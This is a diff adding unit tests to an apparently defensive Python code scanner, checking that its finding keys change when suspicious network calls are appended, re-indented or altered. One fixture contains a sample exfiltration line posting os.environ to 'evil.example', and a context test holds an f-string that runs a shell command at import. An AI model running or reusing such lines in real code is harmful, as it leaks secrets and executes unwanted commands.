@@ -372,6 +372,43 @@ def test_baseline_key_line_shift_stable_but_code_specific():
     assert sp._finding_key(base) != sp._finding_key(malicious)
 
 
+def test_extract_evidence_records_all_matches():
+    # The whole point of P1: a match appended after the first few must show up
+    # in the evidence, so it changes the key instead of riding the earlier ones.
+    src = "import requests\n" + "\n".join(f"requests.get('http://a{i}')" for i in range(6))
+    ev = sp._extract_evidence(src, sp.RE_NETWORK)
+    assert ev.count("requests.get(") == 6
+
+
+def test_baseline_key_reopens_on_appended_match():
+    # A reviewed file already trips a check with several matches; a later exfil
+    # call appended to the same file/check must reopen the finding.
+    base_src = "import requests\n" + "\n".join(f"requests.get('http://a{i}')" for i in range(3))
+    payload_src = base_src + "\nrequests.post('https://evil.example/exfil', data=os.environ)"
+    base = _mk(sp.CRITICAL, "p", "p/net.py", "net", sp._extract_evidence(base_src, sp.RE_NETWORK))
+    payload = _mk(sp.CRITICAL, "p", "p/net.py", "net", sp._extract_evidence(payload_src, sp.RE_NETWORK))
+    assert sp._finding_key(base) != sp._finding_key(payload)
+
+
+def test_baseline_key_inner_line_marker_is_not_stripped():
+    # Only the leading L<NN>: marker is dropped; an L<NN>: inside the matched
+    # code is part of the code, so changing it must reopen the finding...
+    a = _mk(sp.CRITICAL, "p", "p/u.py", "c", "L10: url = 'http://h/L42:/p'")
+    b = _mk(sp.CRITICAL, "p", "p/u.py", "c", "L10: url = 'http://h/L7:/p'")
+    assert sp._finding_key(a) != sp._finding_key(b)
+    # ...while only the leading marker (line number) changing stays stable.
+    c = _mk(sp.CRITICAL, "p", "p/u.py", "c", "L55: url = 'http://h/L42:/p'")
+    assert sp._finding_key(a) == sp._finding_key(c)
+
+
+def test_baseline_key_indentation_is_significant():
+    # Moving a flagged line out of a guarded block (dedent) changes executable
+    # context, so the same code at a different indent must reopen the finding.
+    guarded = _mk(sp.CRITICAL, "p", "p/x.py", "c", "L5:     requests.get(url)")
+    top_level = _mk(sp.CRITICAL, "p", "p/x.py", "c", "L5: requests.get(url)")
+    assert sp._finding_key(guarded) != sp._finding_key(top_level)
+
+
 def test_fstring_statement_is_not_blanked():
     # A bare f-string evaluates at import, so it must stay scannable.
     src = "f\"{__import__('os').system('id')}\"\n"
